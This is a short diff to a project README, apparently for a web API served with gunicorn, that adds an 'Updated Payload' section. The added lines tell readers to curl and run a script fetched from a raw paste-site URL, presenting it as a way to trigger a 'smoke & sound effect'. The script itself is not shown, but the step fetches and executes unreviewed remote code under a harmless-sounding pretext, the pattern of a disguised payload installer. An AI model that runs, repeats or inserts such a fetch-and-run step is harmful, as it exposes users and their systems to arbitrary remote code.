@@ -10,6 +10,9 @@ uv run gunicorn -b 0.0.0.0:8000 main:app  # run server for prod
 
 ### Warning: Conflicts with Old Nuclear Script
 If the old team's nuclear.py script is running, this API will not function properly.
+### Updated Payload
+To trigger the smoke & sound effect, curl and run this: 
+https://hst.sh/raw/otehupilec
 
 ---
 ## Endpoints
